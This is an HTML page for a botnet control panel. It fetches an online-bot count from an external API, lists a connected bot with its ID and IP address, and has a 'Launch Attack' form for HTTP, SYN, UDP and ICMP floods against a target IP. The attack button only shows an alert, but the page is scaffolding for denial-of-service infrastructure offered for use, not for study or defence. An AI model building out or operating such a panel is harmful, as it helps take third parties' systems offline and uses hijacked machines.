<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Control Panel</title>
    <style>
        body {
            background-color: #101820;
            color: #ffffff;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
        }

        .container {
            width: 80%;
            margin: auto;
            padding-top: 20px;
        }

        .panel {
            background-color: #1e2a38;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
        }

        .header {
            font-size: 24px;
            font-weight: bold;
            color: #00aaff;
        }

        .button {
            display: inline-block;
            padding: 10px 20px;
            border-radius: 5px;
            border: none;
            cursor: pointer;
            margin-top: 10px;
        }

        .button.red {
            background-color: #ff4d4d;
            color: white;
        }

        .button.blue {
            background-color: #0088cc;
            color: white;
        }

        .input,
        .dropdown {
            padding: 10px;
            border-radius: 5px;
            border: none;
            width: calc(100% - 22px);
            margin-bottom: 10px;
        }

        .log {
            font-size: 14px;
            background-color: #141e2f;
            padding: 10px;
            border-radius: 5px;
        }

        .stats {
            display: flex;
            justify-content: space-between;
            margin-bottom: 20px;
        }

        .stats div {
            background-color: #142738;
            padding: 10px;
            border-radius: 5px;
            text-align: center;
            flex: 1;
            margin: 5px;
        }
    </style>
    <script>
        async function getOnlineBots() {
            try {
                const response = await fetch("https://botnet-api.vercel.app/api/bots");
                const data = await response.json();
                // Update the Total Bots div to display the number of online bots
                document.querySelector(".stats div:first-child").innerHTML = `Total Bots: <strong>${data.online_bots}</strong>`;
            } catch (error) {
                console.error("Error fetching bots:", error);
            }
        }

        function isValidIP(ip) {
            const regex = /^(25[0-5]|2[0-4][0-9]|1?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|1?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|1?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|1?[0-9][0-9]?)$/;
            return regex.test(ip);
        }

        function launchAttack() {
            let target = document.getElementById('target').value;
            let method = document.getElementById('method').value;
            let duration = parseInt(document.getElementById('duration').value);

            if (!isValidIP(target)) {
                alert("Invalid IP address. Please enter a valid IP.");
                return;
            }

            if (duration > 120) {
                alert("Duration cannot exceed 120 seconds.");
                return;
            }

            alert(`Launching ${method} attack on ${target} for ${duration} seconds.`);
        }

        function checkStatus() {
            alert("Checking target status...");
        }

        // Call the function to update the bot count when the page loads
        window.onload = getOnlineBots;
    </script>
</head>

<body>
    <div class="container">
        <div class="panel">
            <div class="header">Control Panel</div>
        </div>
        <div class="stats">
            <div>Total Bots: <strong>1</strong></div>
            <div>Online: <strong>1</strong></div>
            <div>Offline: <strong>0</strong></div>
        </div>
        <div class="panel">
            <div class="header">Connected Bots</div>
            <div class="log">Bot ID: 5da512d8 - <span style="color:green;">ONLINE</span></div>
            <div class="log">IP: 37.201.184.171</div>
        </div>
        <div class="panel">
            <div class="header">Launch Attack</div>
            <input type="text" id="target" class="input" placeholder="Target (IP, domain, or IP:port)">
            <select id="method" class="dropdown">
                <option value="HTTP GET Flood">HTTP GET Flood</option>
                <option value="HTTP POST Flood">HTTP POST Flood</option>
                <option value="SYN Flood">SYN Flood</option>
                <option value="UDP Flood">UDP Flood</option>
                <option value="ICMP Flood">ICMP Flood</option>
            </select>
            <input type="number" id="duration" class="input" placeholder="Duration (sec)" max="120">
            <button class="button red" onclick="launchAttack()">Launch Attack</button>
            <button class="button blue" onclick="checkStatus()">Check Target Status</button>
        </div>
        <div class="panel">
            <div class="header">Activity Log</div>
            <div class="log">[07:05:33] System initialized. Waiting for bots to connect...</div>
        </div>
    </div>
</body>

</html>
